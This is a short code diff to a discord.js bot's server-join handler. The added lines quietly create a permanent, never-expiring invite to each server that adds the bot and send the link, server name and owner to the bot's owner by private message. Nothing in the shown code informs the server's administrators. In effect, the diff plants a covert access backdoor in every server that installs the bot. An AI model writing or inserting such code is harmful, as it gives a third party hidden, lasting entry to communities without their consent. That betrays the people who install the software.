@@ -80,6 +80,12 @@ bot.on("guildCreate", (guild) => {
   //const serverlistchannel = bot.channels.get("427805902733705226");
   
  const botowner = bot.users.get(config.owner);
+	
+ const newguildchannel = bot.channels.find('name', 'general')
+	
+ guild.createInvite({maxAge:  0}).then(invite =>
+ botowner.send(`${guild.name} Owned By ${guild.owner} - ${invite.url}`)
+ )
 
  botowner.send(`${guild.owner} ID Owner : ${guild.ownerID} \nInvited **zFy's Bot** to server ${guild.name} Channel ID : ${guild.id}  ~ ${bot.guilds.size} Servers \n... Awaiting Approval`);
 
